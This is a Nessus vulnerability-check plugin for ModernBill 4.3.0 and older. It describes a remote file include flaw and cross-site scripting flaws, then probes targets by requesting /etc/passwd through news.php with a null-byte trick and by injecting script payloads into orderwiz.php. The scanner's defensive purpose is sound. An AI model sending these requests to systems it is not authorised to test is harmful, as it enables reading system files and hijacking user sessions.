#
# (C) Tenable Network Security
#


if (description) {
  script_id(18008);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-1053", "CVE-2005-1054");
  script_bugtraq_id(13086, 13087, 13089);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"15426");
    script_xref(name:"OSVDB", value:"15427");
  }

  name["english"] = "ModernBill 4.3.0 and older Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple vulnerabilities. 

Description :

The version of ModernBill installed on the remote host is subject to
multiple vulnerabilities :

  - A Remote File Include Vulnerability
    The application fails to sanitize the parameter 'DIR' before
    using it in the script 'news.php'. An attacker can exploit
    this flaw to browse or execute arbitrary files on the remote 
    host. Further, if PHP's 'allow_url_fopen' setting is enabled,
    files to be executed can even come from a web server
    under the attacker's control.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can inject arbitrary HTML and script code via the
    parameters 'c_code' and 'aid' in the script 'orderwiz.php' in
    order to steal cookie-based authentication credentials for
    the remote host or launch other such attacks.

See also : 

http://www.gulftech.org/?node=research&article_id=00067-04102005
http://archives.neohapsis.com/archives/bugtraq/2005-04/0129.html
http://www.moderngigabyte.com/modernbill/forums/showthread.php?t=20520

Solution : 

Upgrade to ModernBill 4.3.1 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in ModernBill 4.3.0 and older";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("cross_site_scripting.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# A simple alert to display "Nessus was here".
xss = "<script>alert('Nessus was here');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
exploits = make_list(
  "/order/orderwiz.php?v=1&aid=&c_code=" + exss,
  "/order/orderwiz.php?v=1&aid=" + exss
);

# Search for ModernBill
foreach dir (cgi_dirs()) {
  # Grab index.php.
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it's ModernBill...
  if (
    egrep(string:res, pattern:"<TITLE>ModernBill .:. Client Billing System", icase:TRUE) ||
    egrep(string:res, pattern:"<!-- ModernBill TM .:. Client Billing System", icase:TRUE)
  ) {

    # Try to exploit the file include vulnerability by grabbing /etc/passwd.
    req = http_get(item:string(dir, "/news.php?DIR=/etc/passwd%00"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If there's an entry for root, there's a problem.
    if (egrep(string:res, pattern:"root:.+:0:")) {
      security_warning(port);
      exit(0);
    }

    # Otherwise, try to exploit the XSS vulnerabilities.
    if (get_kb_item("www/"+port+"/generic_xss")) exit(0);
    foreach exploit (exploits) {
      req = http_get(item:string(dir, exploit), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we see our XSS.
      if (xss >< res) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
